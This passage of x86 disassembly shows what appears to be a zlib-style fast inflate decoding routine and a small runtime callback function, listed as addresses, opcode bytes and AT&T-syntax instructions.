  408f0c:	5d                   	pop    %ebp
  408f0d:	c3                   	ret
  408f0e:	66 90                	xchg   %ax,%ax
  408f10:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  408f17:	00 
  408f18:	e9 7e fe ff ff       	jmp    0x408d9b
  408f1d:	8d 76 00             	lea    0x0(%esi),%esi
  408f20:	31 ff                	xor    %edi,%edi
  408f22:	c6 44 24 40 60       	movb   $0x60,0x40(%esp)
  408f27:	e9 cf fd ff ff       	jmp    0x408cfb
  408f2c:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  408f30:	0f b6 5c 24 41       	movzbl 0x41(%esp),%ebx
  408f35:	85 c9                	test   %ecx,%ecx
  408f37:	74 17                	je     0x408f50
  408f39:	8b 44 24 14          	mov    0x14(%esp),%eax
  408f3d:	8b 74 24 08          	mov    0x8(%esp),%esi
  408f41:	31 d2                	xor    %edx,%edx
  408f43:	8d 04 b0             	lea    (%eax,%esi,4),%eax
  408f46:	c6 00 40             	movb   $0x40,(%eax)
  408f49:	88 58 01             	mov    %bl,0x1(%eax)
  408f4c:	66 89 50 02          	mov    %dx,0x2(%eax)
  408f50:	8b 9c 24 a4 00 00 00 	mov    0xa4(%esp),%ebx
  408f57:	8b 44 24 24          	mov    0x24(%esp),%eax
  408f5b:	c1 e0 02             	shl    $0x2,%eax
  408f5e:	01 03                	add    %eax,(%ebx)
  408f60:	8b 84 24 a8 00 00 00 	mov    0xa8(%esp),%eax
  408f67:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  408f6b:	89 18                	mov    %ebx,(%eax)
  408f6d:	31 c0                	xor    %eax,%eax
  408f6f:	e9 a1 fc ff ff       	jmp    0x408c15
  408f74:	90                   	nop
  408f75:	90                   	nop
  408f76:	90                   	nop
  408f77:	90                   	nop
  408f78:	90                   	nop
  408f79:	90                   	nop
  408f7a:	90                   	nop
  408f7b:	90                   	nop
  408f7c:	90                   	nop
  408f7d:	90                   	nop
  408f7e:	90                   	nop
  408f7f:	90                   	nop
  408f80:	55                   	push   %ebp
  408f81:	57                   	push   %edi
  408f82:	56                   	push   %esi
  408f83:	53                   	push   %ebx
  408f84:	83 ec 44             	sub    $0x44,%esp
  408f87:	8b 44 24 58          	mov    0x58(%esp),%eax
  408f8b:	8b 40 1c             	mov    0x1c(%eax),%eax
  408f8e:	89 c7                	mov    %eax,%edi
  408f90:	89 44 24 0c          	mov    %eax,0xc(%esp)
  408f94:	8b 44 24 58          	mov    0x58(%esp),%eax
  408f98:	8b 00                	mov    (%eax),%eax
  408f9a:	83 e8 01             	sub    $0x1,%eax
  408f9d:	89 c2                	mov    %eax,%edx
  408f9f:	89 44 24 04          	mov    %eax,0x4(%esp)
  408fa3:	8b 44 24 58          	mov    0x58(%esp),%eax
  408fa7:	8b 40 04             	mov    0x4(%eax),%eax
  408faa:	8d 44 02 fb          	lea    -0x5(%edx,%eax,1),%eax
  408fae:	89 44 24 10          	mov    %eax,0x10(%esp)
  408fb2:	8b 44 24 58          	mov    0x58(%esp),%eax
  408fb6:	8b 40 0c             	mov    0xc(%eax),%eax
  408fb9:	83 e8 01             	sub    $0x1,%eax
  408fbc:	89 c6                	mov    %eax,%esi
  408fbe:	89 44 24 08          	mov    %eax,0x8(%esp)
  408fc2:	8b 44 24 58          	mov    0x58(%esp),%eax
  408fc6:	8b 40 10             	mov    0x10(%eax),%eax
  408fc9:	89 c2                	mov    %eax,%edx
  408fcb:	8d 84 06 ff fe ff ff 	lea    -0x101(%esi,%eax,1),%eax
  408fd2:	2b 54 24 5c          	sub    0x5c(%esp),%edx
  408fd6:	89 44 24 14          	mov    %eax,0x14(%esp)
  408fda:	89 f8                	mov    %edi,%eax
  408fdc:	8b 7f 28             	mov    0x28(%edi),%edi
  408fdf:	8b 58 4c             	mov    0x4c(%eax),%ebx
  408fe2:	8b 68 3c             	mov    0x3c(%eax),%ebp
  408fe5:	01 f2                	add    %esi,%edx
  408fe7:	89 7c 24 20          	mov    %edi,0x20(%esp)
  408feb:	8b 78 30             	mov    0x30(%eax),%edi
  408fee:	89 54 24 30          	mov    %edx,0x30(%esp)
  408ff2:	8b 50 2c             	mov    0x2c(%eax),%edx
  408ff5:	89 fe                	mov    %edi,%esi
  408ff7:	89 7c 24 2c          	mov    %edi,0x2c(%esp)
  408ffb:	8b 78 34             	mov    0x34(%eax),%edi
  408ffe:	89 54 24 34          	mov    %edx,0x34(%esp)
  409002:	8b 50 38             	mov    0x38(%eax),%edx
  409005:	89 7c 24 24          	mov    %edi,0x24(%esp)
  409009:	89 1c 24             	mov    %ebx,(%esp)
  40900c:	89 c7                	mov    %eax,%edi
  40900e:	8b 58 50             	mov    0x50(%eax),%ebx
  409011:	8b 48 54             	mov    0x54(%eax),%ecx
  409014:	b8 01 00 00 00       	mov    $0x1,%eax
  409019:	89 5c 24 1c          	mov    %ebx,0x1c(%esp)
  40901d:	89 c3                	mov    %eax,%ebx
  40901f:	d3 e3                	shl    %cl,%ebx
  409021:	8b 4f 58             	mov    0x58(%edi),%ecx
  409024:	8b 7c 24 24          	mov    0x24(%esp),%edi
  409028:	8d 5b ff             	lea    -0x1(%ebx),%ebx
  40902b:	d3 e0                	shl    %cl,%eax
  40902d:	89 5c 24 18          	mov    %ebx,0x18(%esp)
  409031:	8d 58 ff             	lea    -0x1(%eax),%ebx
  409034:	89 5c 24 28          	mov    %ebx,0x28(%esp)
  409038:	8d 5f ff             	lea    -0x1(%edi),%ebx
  40903b:	8b 7c 24 20          	mov    0x20(%esp),%edi
  40903f:	89 5c 24 38          	mov    %ebx,0x38(%esp)
  409043:	01 f7                	add    %esi,%edi
  409045:	89 7c 24 40          	mov    %edi,0x40(%esp)
  409049:	83 fd 0e             	cmp    $0xe,%ebp
  40904c:	77 25                	ja     0x409073
  40904e:	8b 7c 24 04          	mov    0x4(%esp),%edi
  409052:	89 e9                	mov    %ebp,%ecx
  409054:	0f b6 5f 01          	movzbl 0x1(%edi),%ebx
  409058:	0f b6 47 02          	movzbl 0x2(%edi),%eax
  40905c:	d3 e3                	shl    %cl,%ebx
  40905e:	8d 4d 08             	lea    0x8(%ebp),%ecx
  409061:	83 c5 10             	add    $0x10,%ebp
  409064:	d3 e0                	shl    %cl,%eax
  409066:	01 c3                	add    %eax,%ebx
  409068:	89 f8                	mov    %edi,%eax
  40906a:	83 c0 02             	add    $0x2,%eax
  40906d:	01 da                	add    %ebx,%edx
  40906f:	89 44 24 04          	mov    %eax,0x4(%esp)
  409073:	8b 44 24 18          	mov    0x18(%esp),%eax
  409077:	8b 3c 24             	mov    (%esp),%edi
  40907a:	21 d0                	and    %edx,%eax
  40907c:	8d 04 87             	lea    (%edi,%eax,4),%eax
  40907f:	0f b6 70 01          	movzbl 0x1(%eax),%esi
  409083:	0f b6 18             	movzbl (%eax),%ebx
  409086:	0f b7 40 02          	movzwl 0x2(%eax),%eax
  40908a:	89 f1                	mov    %esi,%ecx
  40908c:	29 f5                	sub    %esi,%ebp
  40908e:	d3 ea                	shr    %cl,%edx
  409090:	84 db                	test   %bl,%bl
  409092:	74 58                	je     0x4090ec
  409094:	f6 c3 10             	test   $0x10,%bl
  409097:	0f 85 e3 00 00 00    	jne    0x409180
  40909d:	f6 c3 40             	test   $0x40,%bl
  4090a0:	0f 85 ba 02 00 00    	jne    0x409360
  4090a6:	bf 01 00 00 00       	mov    $0x1,%edi
  4090ab:	eb 15                	jmp    0x4090c2
  4090ad:	8d 76 00             	lea    0x0(%esi),%esi
  4090b0:	f6 c3 10             	test   $0x10,%bl
  4090b3:	0f 85 c7 00 00 00    	jne    0x409180
  4090b9:	f6 c3 40             	test   $0x40,%bl
  4090bc:	0f 85 9e 02 00 00    	jne    0x409360
  4090c2:	89 d9                	mov    %ebx,%ecx
  4090c4:	89 fe                	mov    %edi,%esi
  4090c6:	d3 e6                	shl    %cl,%esi
  4090c8:	89 f1                	mov    %esi,%ecx
  4090ca:	83 e9 01             	sub    $0x1,%ecx
  4090cd:	21 d1                	and    %edx,%ecx
  4090cf:	01 c1                	add    %eax,%ecx
  4090d1:	8b 04 24             	mov    (%esp),%eax
  4090d4:	8d 04 88             	lea    (%eax,%ecx,4),%eax
  4090d7:	0f b6 70 01          	movzbl 0x1(%eax),%esi
  4090db:	0f b6 18             	movzbl (%eax),%ebx
  4090de:	0f b7 40 02          	movzwl 0x2(%eax),%eax
  4090e2:	89 f1                	mov    %esi,%ecx
  4090e4:	29 f5                	sub    %esi,%ebp
  4090e6:	d3 ea                	shr    %cl,%edx
  4090e8:	84 db                	test   %bl,%bl
  4090ea:	75 c4                	jne    0x4090b0
  4090ec:	8b 7c 24 08          	mov    0x8(%esp),%edi
  4090f0:	88 47 01             	mov    %al,0x1(%edi)
  4090f3:	8d 47 01             	lea    0x1(%edi),%eax
  4090f6:	89 44 24 08          	mov    %eax,0x8(%esp)
  4090fa:	8b 7c 24 14          	mov    0x14(%esp),%edi
  4090fe:	39 7c 24 08          	cmp    %edi,0x8(%esp)
  409102:	73 0e                	jae    0x409112
  409104:	8b 7c 24 10          	mov    0x10(%esp),%edi
  409108:	39 7c 24 04          	cmp    %edi,0x4(%esp)
  40910c:	0f 82 37 ff ff ff    	jb     0x409049
  409112:	8b 44 24 04          	mov    0x4(%esp),%eax
  409116:	89 e9                	mov    %ebp,%ecx
  409118:	bb 01 00 00 00       	mov    $0x1,%ebx
  40911d:	c1 e9 03             	shr    $0x3,%ecx
  409120:	8b 7c 24 58          	mov    0x58(%esp),%edi
  409124:	8b 74 24 58          	mov    0x58(%esp),%esi
  409128:	29 c8                	sub    %ecx,%eax
  40912a:	c1 e1 03             	shl    $0x3,%ecx
  40912d:	29 cd                	sub    %ecx,%ebp
  40912f:	89 e9                	mov    %ebp,%ecx
  409131:	d3 e3                	shl    %cl,%ebx
  409133:	83 eb 01             	sub    $0x1,%ebx
  409136:	21 da                	and    %ebx,%edx
  409138:	8d 58 01             	lea    0x1(%eax),%ebx
  40913b:	89 1f                	mov    %ebx,(%edi)
  40913d:	8b 7c 24 08          	mov    0x8(%esp),%edi
  409141:	8d 5f 01             	lea    0x1(%edi),%ebx
  409144:	89 5e 0c             	mov    %ebx,0xc(%esi)
  409147:	8b 74 24 10          	mov    0x10(%esp),%esi
  40914b:	29 c6                	sub    %eax,%esi
  40914d:	89 f0                	mov    %esi,%eax
  40914f:	8b 74 24 58          	mov    0x58(%esp),%esi
  409153:	83 c0 05             	add    $0x5,%eax
  409156:	89 46 04             	mov    %eax,0x4(%esi)
  409159:	8b 44 24 14          	mov    0x14(%esp),%eax
  40915d:	29 f8                	sub    %edi,%eax
  40915f:	05 01 01 00 00       	add    $0x101,%eax
  409164:	89 46 10             	mov    %eax,0x10(%esi)
  409167:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40916b:	89 50 38             	mov    %edx,0x38(%eax)
  40916e:	89 68 3c             	mov    %ebp,0x3c(%eax)
  409171:	83 c4 44             	add    $0x44,%esp
  409174:	5b                   	pop    %ebx
  409175:	5e                   	pop    %esi
  409176:	5f                   	pop    %edi
  409177:	5d                   	pop    %ebp
  409178:	c3                   	ret
  409179:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  409180:	83 e3 0f             	and    $0xf,%ebx
  409183:	0f b7 f8             	movzwl %ax,%edi
  409186:	74 37                	je     0x4091bf
  409188:	0f b6 f3             	movzbl %bl,%esi
  40918b:	39 ee                	cmp    %ebp,%esi
  40918d:	76 1c                	jbe    0x4091ab
  40918f:	8b 44 24 04          	mov    0x4(%esp),%eax
  409193:	89 e9                	mov    %ebp,%ecx
  409195:	83 c5 08             	add    $0x8,%ebp
  409198:	0f b6 40 01          	movzbl 0x1(%eax),%eax
  40919c:	d3 e0                	shl    %cl,%eax
  40919e:	01 c2                	add    %eax,%edx
  4091a0:	8b 44 24 04          	mov    0x4(%esp),%eax
  4091a4:	83 c0 01             	add    $0x1,%eax
  4091a7:	89 44 24 04          	mov    %eax,0x4(%esp)
  4091ab:	89 d9                	mov    %ebx,%ecx
  4091ad:	b8 01 00 00 00       	mov    $0x1,%eax
  4091b2:	29 f5                	sub    %esi,%ebp
  4091b4:	d3 e0                	shl    %cl,%eax
  4091b6:	83 e8 01             	sub    $0x1,%eax
  4091b9:	21 d0                	and    %edx,%eax
  4091bb:	d3 ea                	shr    %cl,%edx
  4091bd:	01 c7                	add    %eax,%edi
  4091bf:	83 fd 0e             	cmp    $0xe,%ebp
  4091c2:	0f 86 b8 01 00 00    	jbe    0x409380
  4091c8:	8b 44 24 28          	mov    0x28(%esp),%eax
  4091cc:	8b 74 24 1c          	mov    0x1c(%esp),%esi
  4091d0:	21 d0                	and    %edx,%eax
  4091d2:	8d 04 86             	lea    (%esi,%eax,4),%eax
  4091d5:	0f b6 70 01          	movzbl 0x1(%eax),%esi
  4091d9:	0f b6 18             	movzbl (%eax),%ebx
  4091dc:	0f b7 40 02          	movzwl 0x2(%eax),%eax
  4091e0:	89 f1                	mov    %esi,%ecx
  4091e2:	29 f5                	sub    %esi,%ebp
  4091e4:	d3 ea                	shr    %cl,%edx
  4091e6:	f6 c3 10             	test   $0x10,%bl
  4091e9:	75 4d                	jne    0x409238
  4091eb:	f6 c3 40             	test   $0x40,%bl
  4091ee:	0f 85 dc 01 00 00    	jne    0x4093d0
  4091f4:	89 7c 24 3c          	mov    %edi,0x3c(%esp)
  4091f8:	8b 7c 24 1c          	mov    0x1c(%esp),%edi
  4091fc:	eb 0b                	jmp    0x409209
  4091fe:	66 90                	xchg   %ax,%ax
  409200:	f6 c3 40             	test   $0x40,%bl
  409203:	0f 85 c7 01 00 00    	jne    0x4093d0
  409209:	89 d9                	mov    %ebx,%ecx
  40920b:	be 01 00 00 00       	mov    $0x1,%esi
  409210:	d3 e6                	shl    %cl,%esi
  409212:	89 f1                	mov    %esi,%ecx
  409214:	83 e9 01             	sub    $0x1,%ecx
  409217:	21 d1                	and    %edx,%ecx
  409219:	01 c1                	add    %eax,%ecx
  40921b:	8d 04 8f             	lea    (%edi,%ecx,4),%eax
  40921e:	0f b6 70 01          	movzbl 0x1(%eax),%esi
  409222:	0f b6 18             	movzbl (%eax),%ebx
  409225:	0f b7 40 02          	movzwl 0x2(%eax),%eax
  409229:	89 f1                	mov    %esi,%ecx
  40922b:	29 f5                	sub    %esi,%ebp
  40922d:	d3 ea                	shr    %cl,%edx
  40922f:	f6 c3 10             	test   $0x10,%bl
  409232:	74 cc                	je     0x409200
  409234:	8b 7c 24 3c          	mov    0x3c(%esp),%edi
  409238:	83 e3 0f             	and    $0xf,%ebx
  40923b:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  40923f:	0f b6 f3             	movzbl %bl,%esi
  409242:	39 ee                	cmp    %ebp,%esi
  409244:	76 20                	jbe    0x409266
  409246:	8b 44 24 04          	mov    0x4(%esp),%eax
  40924a:	89 e9                	mov    %ebp,%ecx
  40924c:	0f b6 40 01          	movzbl 0x1(%eax),%eax
  409250:	d3 e0                	shl    %cl,%eax
  409252:	8d 4d 08             	lea    0x8(%ebp),%ecx
  409255:	01 c2                	add    %eax,%edx
  409257:	39 ce                	cmp    %ecx,%esi
  409259:	0f 87 8a 02 00 00    	ja     0x4094e9
  40925f:	83 44 24 04 01       	addl   $0x1,0x4(%esp)
  409264:	89 cd                	mov    %ecx,%ebp
  409266:	89 d9                	mov    %ebx,%ecx
  409268:	b8 01 00 00 00       	mov    $0x1,%eax
  40926d:	29 f5                	sub    %esi,%ebp
  40926f:	d3 e0                	shl    %cl,%eax
  409271:	83 e8 01             	sub    $0x1,%eax
  409274:	21 d0                	and    %edx,%eax
  409276:	03 44 24 3c          	add    0x3c(%esp),%eax
  40927a:	d3 ea                	shr    %cl,%edx
  40927c:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  409280:	8b 44 24 08          	mov    0x8(%esp),%eax
  409284:	2b 44 24 30          	sub    0x30(%esp),%eax
  409288:	39 44 24 3c          	cmp    %eax,0x3c(%esp)
  40928c:	0f 86 58 01 00 00    	jbe    0x4093ea
  409292:	8b 4c 24 3c          	mov    0x3c(%esp),%ecx
  409296:	29 c1                	sub    %eax,%ecx
  409298:	39 4c 24 34          	cmp    %ecx,0x34(%esp)
  40929c:	73 12                	jae    0x4092b0
  40929e:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4092a2:	8b 98 c0 1b 00 00    	mov    0x1bc0(%eax),%ebx
  4092a8:	85 db                	test   %ebx,%ebx
  4092aa:	0f 85 a8 02 00 00    	jne    0x409558
  4092b0:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  4092b4:	85 c0                	test   %eax,%eax
  4092b6:	0f 85 a2 01 00 00    	jne    0x40945e
  4092bc:	8b 44 24 20          	mov    0x20(%esp),%eax
  4092c0:	29 c8                	sub    %ecx,%eax
  4092c2:	03 44 24 38          	add    0x38(%esp),%eax
  4092c6:	39 cf                	cmp    %ecx,%edi
  4092c8:	76 31                	jbe    0x4092fb
  4092ca:	8b 74 24 08          	mov    0x8(%esp),%esi
  4092ce:	29 cf                	sub    %ecx,%edi
  4092d0:	89 f3                	mov    %esi,%ebx
  4092d2:	01 f1                	add    %esi,%ecx
  4092d4:	89 d6                	mov    %edx,%esi
  4092d6:	8d 76 00             	lea    0x0(%esi),%esi
  4092d9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  4092e0:	83 c0 01             	add    $0x1,%eax
  4092e3:	0f b6 10             	movzbl (%eax),%edx
  4092e6:	83 c3 01             	add    $0x1,%ebx
  4092e9:	39 cb                	cmp    %ecx,%ebx
  4092eb:	88 13                	mov    %dl,(%ebx)
  4092ed:	75 f1                	jne    0x4092e0
  4092ef:	89 d8                	mov    %ebx,%eax
  4092f1:	2b 44 24 3c          	sub    0x3c(%esp),%eax
  4092f5:	89 5c 24 08          	mov    %ebx,0x8(%esp)
  4092f9:	89 f2                	mov    %esi,%edx
  4092fb:	83 ff 02             	cmp    $0x2,%edi
  4092fe:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  409302:	76 25                	jbe    0x409329
  409304:	0f b6 58 01          	movzbl 0x1(%eax),%ebx
  409308:	83 c0 03             	add    $0x3,%eax
  40930b:	83 ef 03             	sub    $0x3,%edi
  40930e:	83 c1 03             	add    $0x3,%ecx
  409311:	88 59 fe             	mov    %bl,-0x2(%ecx)
  409314:	0f b6 58 ff          	movzbl -0x1(%eax),%ebx
  409318:	88 59 ff             	mov    %bl,-0x1(%ecx)
  40931b:	0f b6 18             	movzbl (%eax),%ebx
  40931e:	83 ff 02             	cmp    $0x2,%edi
  409321:	88 19                	mov    %bl,(%ecx)
  409323:	77 df                	ja     0x409304
  409325:	89 4c 24 08          	mov    %ecx,0x8(%esp)
  409329:	85 ff                	test   %edi,%edi
  40932b:	0f 84 c9 fd ff ff    	je     0x4090fa
  409331:	0f b6 48 01          	movzbl 0x1(%eax),%ecx
  409335:	8b 74 24 08          	mov    0x8(%esp),%esi
  409339:	83 ff 02             	cmp    $0x2,%edi
  40933c:	88 4e 01             	mov    %cl,0x1(%esi)
  40933f:	0f 85 ff 01 00 00    	jne    0x409544
  409345:	0f b6 40 02          	movzbl 0x2(%eax),%eax
  409349:	8b 7c 24 08          	mov    0x8(%esp),%edi
  40934d:	88 47 02             	mov    %al,0x2(%edi)
  409350:	8d 47 02             	lea    0x2(%edi),%eax
  409353:	89 44 24 08          	mov    %eax,0x8(%esp)
  409357:	e9 9e fd ff ff       	jmp    0x4090fa
  40935c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  409360:	89 de                	mov    %ebx,%esi
  409362:	83 e6 20             	and    $0x20,%esi
  409365:	74 49                	je     0x4093b0
  409367:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40936b:	c7 00 0b 00 00 00    	movl   $0xb,(%eax)
  409371:	e9 9c fd ff ff       	jmp    0x409112
  409376:	8d 76 00             	lea    0x0(%esi),%esi
  409379:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  409380:	8b 74 24 04          	mov    0x4(%esp),%esi
  409384:	89 e9                	mov    %ebp,%ecx
  409386:	0f b6 5e 01          	movzbl 0x1(%esi),%ebx
  40938a:	0f b6 46 02          	movzbl 0x2(%esi),%eax
  40938e:	d3 e3                	shl    %cl,%ebx
  409390:	8d 4d 08             	lea    0x8(%ebp),%ecx
  409393:	83 c5 10             	add    $0x10,%ebp
  409396:	d3 e0                	shl    %cl,%eax
  409398:	01 c3                	add    %eax,%ebx
  40939a:	89 f0                	mov    %esi,%eax
  40939c:	83 c0 02             	add    $0x2,%eax
  40939f:	01 da                	add    %ebx,%edx
  4093a1:	89 44 24 04          	mov    %eax,0x4(%esp)
  4093a5:	e9 1e fe ff ff       	jmp    0x4091c8
  4093aa:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  4093b0:	8b 44 24 58          	mov    0x58(%esp),%eax
  4093b4:	c7 40 18 34 02 41 00 	movl   $0x410234,0x18(%eax)
  4093bb:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4093bf:	c7 00 1d 00 00 00    	movl   $0x1d,(%eax)
  4093c5:	e9 48 fd ff ff       	jmp    0x409112
  4093ca:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  4093d0:	8b 44 24 58          	mov    0x58(%esp),%eax
  4093d4:	c7 40 18 1e 02 41 00 	movl   $0x41021e,0x18(%eax)
  4093db:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4093df:	c7 00 1d 00 00 00    	movl   $0x1d,(%eax)
  4093e5:	e9 28 fd ff ff       	jmp    0x409112
  4093ea:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  4093ee:	89 d8                	mov    %ebx,%eax
  4093f0:	2b 44 24 3c          	sub    0x3c(%esp),%eax
  4093f4:	89 54 24 3c          	mov    %edx,0x3c(%esp)
  4093f8:	eb 0a                	jmp    0x409404
  4093fa:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  409400:	89 f0                	mov    %esi,%eax
  409402:	89 cb                	mov    %ecx,%ebx
  409404:	0f b6 48 01          	movzbl 0x1(%eax),%ecx
  409408:	83 ef 03             	sub    $0x3,%edi
  40940b:	8d 70 03             	lea    0x3(%eax),%esi
  40940e:	83 ff 02             	cmp    $0x2,%edi
  409411:	88 4b 01             	mov    %cl,0x1(%ebx)
  409414:	0f b6 48 02          	movzbl 0x2(%eax),%ecx
  409418:	88 4b 02             	mov    %cl,0x2(%ebx)
  40941b:	0f b6 50 03          	movzbl 0x3(%eax),%edx
  40941f:	8d 4b 03             	lea    0x3(%ebx),%ecx
  409422:	88 53 03             	mov    %dl,0x3(%ebx)
  409425:	77 d9                	ja     0x409400
  409427:	85 ff                	test   %edi,%edi
  409429:	89 5c 24 08          	mov    %ebx,0x8(%esp)
  40942d:	8b 54 24 3c          	mov    0x3c(%esp),%edx
  409431:	0f 84 d1 00 00 00    	je     0x409508
  409437:	0f b6 48 04          	movzbl 0x4(%eax),%ecx
  40943b:	83 ff 02             	cmp    $0x2,%edi
  40943e:	88 4b 04             	mov    %cl,0x4(%ebx)
  409441:	0f 85 07 01 00 00    	jne    0x40954e
  409447:	0f b6 40 05          	movzbl 0x5(%eax),%eax
  40944b:	8b 7c 24 08          	mov    0x8(%esp),%edi
  40944f:	88 47 05             	mov    %al,0x5(%edi)
  409452:	8d 47 05             	lea    0x5(%edi),%eax
  409455:	89 44 24 08          	mov    %eax,0x8(%esp)
  409459:	e9 9c fc ff ff       	jmp    0x4090fa
  40945e:	39 4c 24 2c          	cmp    %ecx,0x2c(%esp)
  409462:	0f 83 a9 00 00 00    	jae    0x409511
  409468:	8b 44 24 40          	mov    0x40(%esp),%eax
  40946c:	29 c8                	sub    %ecx,%eax
  40946e:	2b 4c 24 2c          	sub    0x2c(%esp),%ecx
  409472:	03 44 24 38          	add    0x38(%esp),%eax
  409476:	39 cf                	cmp    %ecx,%edi
  409478:	0f 86 7d fe ff ff    	jbe    0x4092fb
  40947e:	8b 74 24 08          	mov    0x8(%esp),%esi
  409482:	29 cf                	sub    %ecx,%edi
  409484:	89 f3                	mov    %esi,%ebx
  409486:	01 f1                	add    %esi,%ecx
  409488:	89 d6                	mov    %edx,%esi
  40948a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  409490:	83 c0 01             	add    $0x1,%eax
  409493:	0f b6 10             	movzbl (%eax),%edx
  409496:	83 c3 01             	add    $0x1,%ebx
  409499:	39 cb                	cmp    %ecx,%ebx
  40949b:	88 13                	mov    %dl,(%ebx)
  40949d:	75 f1                	jne    0x409490
  40949f:	39 7c 24 2c          	cmp    %edi,0x2c(%esp)
  4094a3:	89 5c 24 08          	mov    %ebx,0x8(%esp)
  4094a7:	89 f2                	mov    %esi,%edx
  4094a9:	8b 44 24 38          	mov    0x38(%esp),%eax
  4094ad:	0f 83 48 fe ff ff    	jae    0x4092fb
  4094b3:	8b 5c 24 2c          	mov    0x2c(%esp),%ebx
  4094b7:	8b 74 24 24          	mov    0x24(%esp),%esi
  4094bb:	31 c0                	xor    %eax,%eax
  4094bd:	89 54 24 08          	mov    %edx,0x8(%esp)
  4094c1:	29 df                	sub    %ebx,%edi
  4094c3:	0f b6 14 06          	movzbl (%esi,%eax,1),%edx
  4094c7:	88 54 01 01          	mov    %dl,0x1(%ecx,%eax,1)
  4094cb:	83 c0 01             	add    $0x1,%eax
  4094ce:	39 d8                	cmp    %ebx,%eax
  4094d0:	75 f1                	jne    0x4094c3
  4094d2:	03 4c 24 2c          	add    0x2c(%esp),%ecx
  4094d6:	8b 54 24 08          	mov    0x8(%esp),%edx
  4094da:	89 c8                	mov    %ecx,%eax
  4094dc:	89 4c 24 08          	mov    %ecx,0x8(%esp)
  4094e0:	2b 44 24 3c          	sub    0x3c(%esp),%eax
  4094e4:	e9 12 fe ff ff       	jmp    0x4092fb
  4094e9:	8b 44 24 04          	mov    0x4(%esp),%eax
  4094ed:	83 c5 10             	add    $0x10,%ebp
  4094f0:	0f b6 40 02          	movzbl 0x2(%eax),%eax
  4094f4:	d3 e0                	shl    %cl,%eax
  4094f6:	01 c2                	add    %eax,%edx
  4094f8:	8b 44 24 04          	mov    0x4(%esp),%eax
  4094fc:	83 c0 02             	add    $0x2,%eax
  4094ff:	89 44 24 04          	mov    %eax,0x4(%esp)
  409503:	e9 5e fd ff ff       	jmp    0x409266
  409508:	89 4c 24 08          	mov    %ecx,0x8(%esp)
  40950c:	e9 e9 fb ff ff       	jmp    0x4090fa
  409511:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  409515:	29 c8                	sub    %ecx,%eax
  409517:	03 44 24 38          	add    0x38(%esp),%eax
  40951b:	39 cf                	cmp    %ecx,%edi
  40951d:	0f 86 d8 fd ff ff    	jbe    0x4092fb
  409523:	8b 74 24 08          	mov    0x8(%esp),%esi
  409527:	29 cf                	sub    %ecx,%edi
  409529:	89 f3                	mov    %esi,%ebx
  40952b:	01 f1                	add    %esi,%ecx
  40952d:	89 d6                	mov    %edx,%esi
  40952f:	90                   	nop
  409530:	83 c0 01             	add    $0x1,%eax
  409533:	0f b6 10             	movzbl (%eax),%edx
  409536:	83 c3 01             	add    $0x1,%ebx
  409539:	39 cb                	cmp    %ecx,%ebx
  40953b:	88 13                	mov    %dl,(%ebx)
  40953d:	75 f1                	jne    0x409530
  40953f:	e9 ab fd ff ff       	jmp    0x4092ef
  409544:	83 44 24 08 01       	addl   $0x1,0x8(%esp)
  409549:	e9 ac fb ff ff       	jmp    0x4090fa
  40954e:	83 44 24 08 04       	addl   $0x4,0x8(%esp)
  409553:	e9 a2 fb ff ff       	jmp    0x4090fa
  409558:	8b 44 24 58          	mov    0x58(%esp),%eax
  40955c:	c7 40 18 00 02 41 00 	movl   $0x410200,0x18(%eax)
  409563:	8b 44 24 0c          	mov    0xc(%esp),%eax
  409567:	c7 00 1d 00 00 00    	movl   $0x1d,(%eax)
  40956d:	e9 a0 fb ff ff       	jmp    0x409112
  409572:	90                   	nop
  409573:	90                   	nop
  409574:	90                   	nop
  409575:	90                   	nop
  409576:	90                   	nop
  409577:	90                   	nop
  409578:	90                   	nop
  409579:	90                   	nop
  40957a:	90                   	nop
  40957b:	90                   	nop
  40957c:	90                   	nop
  40957d:	90                   	nop
  40957e:	90                   	nop
  40957f:	90                   	nop
  409580:	83 ec 1c             	sub    $0x1c,%esp
  409583:	8b 44 24 24          	mov    0x24(%esp),%eax
  409587:	85 c0                	test   %eax,%eax
  409589:	74 15                	je     0x4095a0
  40958b:	83 f8 03             	cmp    $0x3,%eax
  40958e:	74 10                	je     0x4095a0
  409590:	b8 01 00 00 00       	mov    $0x1,%eax
  409595:	83 c4 1c             	add    $0x1c,%esp
  409598:	c2 0c 00             	ret    $0xc
  40959b:	90                   	nop
  40959c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4095a0:	8b 54 24 28          	mov    0x28(%esp),%edx
  4095a4:	89 44 24 04          	mov    %eax,0x4(%esp)
  4095a8:	8b 44 24 20          	mov    0x20(%esp),%eax
  4095ac:	89 54 24 08          	mov    %edx,0x8(%esp)
  4095b0:	89 04 24             	mov    %eax,(%esp)
  4095b3:	e8 b8 0b 00 00       	call   0x40a170
  4095b8:	b8 01 00 00 00       	mov    $0x1,%eax
  4095bd:	83 c4 1c             	add    $0x1c,%esp
  4095c0:	c2 0c 00             	ret    $0xc
  4095c3:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  4095c9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  4095d0:	53                   	push   %ebx
  4095d1:	83 ec 18             	sub    $0x18,%esp
  4095d4:	83 3d 1c b0 40 00 02 	cmpl   $0x2,0x40b01c
